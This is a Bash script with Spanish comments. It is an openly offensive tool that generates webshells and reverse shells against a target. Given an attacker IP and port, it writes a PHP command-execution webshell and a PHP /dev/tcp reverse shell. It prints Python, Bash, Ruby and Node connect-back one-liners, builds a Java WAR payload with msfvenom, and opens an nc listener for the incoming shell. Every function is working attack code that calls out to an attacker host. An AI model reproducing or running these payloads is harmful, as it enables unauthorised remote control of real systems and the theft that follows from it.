#!/bin/bash

#valorar si es usuario root
if [ $(id -u) -ne 0 ];
then
    echo -e "\033[0;31m\nSe necesita usuario root para poder ejecutar el script\e[0m\n"
    exit
fi


# Función para mostrar la ayuda
function mostrar_ayuda {
    echo -e "\e[34mUso: $0 -s <IP_ATACANTE> [-p <PUERTO>] -f <FUNCION>\e[0m"
    echo
    echo -e "\e[34mOpciones:\e[0m"
    echo -e "  -s, --server       IP del del atacante"
    echo -e "  -p, --port         Puerto para ponerse a la escucha"
    echo -e "  -f, --function     Función a ejecutar"
    echo -e "                     Funciones disponibles:"
    echo -e "                     - \e[32mr_webshell\e[0m"
    echo -e "                     - \e[32mr_php\e[0m"
    echo -e "                     - \e[32mr_python\e[0m"
    echo -e "                     - \e[32mr_java\e[0m"
    echo -e "                     - \e[32mr_bash\e[0m"
    echo -e "                     - \e[32mr_ruby\e[0m"
    echo -e "                     - \e[32mr_node\e[0m"
    echo -e "  -h, --help         Mostrar esta ayuda"
}
#webshell
function r_webshell {
    echo "<?php system($_GET['cmd']); ?>" > webshell.php
    echo -e "[\033[0;32m+\e[0m] \033[0;36mArchivo con la creación de la webshell creado con éxito y listo para subirlo!\e[0m"
}

#php
function r_php {
    echo "<?php exec('/bin/bash -c \"bash -i > /dev/tcp/$SERVER_IP/$PORT 0>&1\"'); ?>" > revers.php
    nc -lnvp $PORT
}

#python
function r_python {
    echo -e "\033[0;36m\nCópia lo siguiente para generarte la reverse shell!: \e[0m "
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$SERVER_IP",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"
    nc -lnvp $PORT
}

#java
function r_java {
    test -f /usr/bin/msfvenom

    if [ "$(echo $?)" == "0" ];
    then
        msfvenom -p java/shell_reverse_tcp LHOST=$SERVER_IP LPORT=$PORT -f war -o shell.war
        echo -e "[\033[0;32m+\e[0m] \033[0;36mArchivo con la reverse shell en java creado y listo para ejecutar!\e[0m"
        nc -lnvp $PORT
    else
        echo -e "033[0;31m\n[!] Hay que instalar las dependencias.\e[0m\n" && apt update >/dev/null && apt install metasploit-framework && echo -e "\n[\033[0;32m+\e[0m]\033[0;36m'Dependencias instaladas con éxito!.\e[0m\n"
    fi
}

#bash
function r_bash {
    echo -e "[\033[0;32m+\e[0m] \033[0;36mAquí tienes tu reverse shell creada! --> \e[0m sh -i >& /dev/tcp/$SERVER_IP/$PORT 0>&1"
    nc -lnvp $PORT
}

#ruby
function r_ruby {
    echo -e "[\033[0;32m+\e[0m] \033[0;36mAquí tienes tu reverse shell creada! --> \e[0m ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$SERVER_IP",$PORT))'"
    nc -lnvp $PORT
}

#node
function r_node {
    echo -e "[\033[0;32m+\e[0m] \033[0;36mAquí tienes tu reverse shell creada! --> \e[0m require('child_process').exec('nc -e sh $SERVER_IP $PORT')"
    nc -lnvp $PORT
}

# Variables
SERVER_IP=""
PORT=""
FUNCTION=""

test -f /usr/bin/nmap

if [ "$(echo $?)" == "0" ];
then
    while [[ "$#" -gt 0 ]]; do
        case $1 in
            -s|--server) SERVER_IP="$2"; shift ;;
            -p|--port) PORT="$2"; shift ;;
            -f|--function) FUNCTION="$2"; shift ;;
            -h|--help) mostrar_ayuda; exit 0 ;;
            *) echo -e "\e[31mOpción desconocida: $1\e[0m"; mostrar_ayuda; exit 1 ;;
        esac
        shift
    done

    # Verificar si se proporcionaron todos los argumentos necesarios
    if [[ -z "$SERVER_IP" || -z "$FUNCTION" ]]; then
        echo -e "\033[0;31mError: faltan argumentos.\e[0m"
        mostrar_ayuda
        exit 1
    fi

    # Ejecutar la función especificada
    case $FUNCTION in
        r_webshell) r_webshell ;;
        r_php) r_php ;;
        r_python) r_python ;;
        r_java) r_java ;;
        r_bash) r_bash ;;
        r_ruby) r_ruby ;;
        r_node) r_node ;;
        *) echo -e "\e[31mFunción desconocida: $FUNCTION\e[0m"; mostrar_ayuda; exit 1 ;;
    esac
else
    echo -e "033[0;31m\n[!] Hay que instalar las dependencias.\e[0m\n" && apt update >/dev/null && apt install nmap && echo -e "\n[\033[0;32m+\e[0m]\033[0;36m'Dependencias instaladas con éxito!.\e[0m\n"
fi
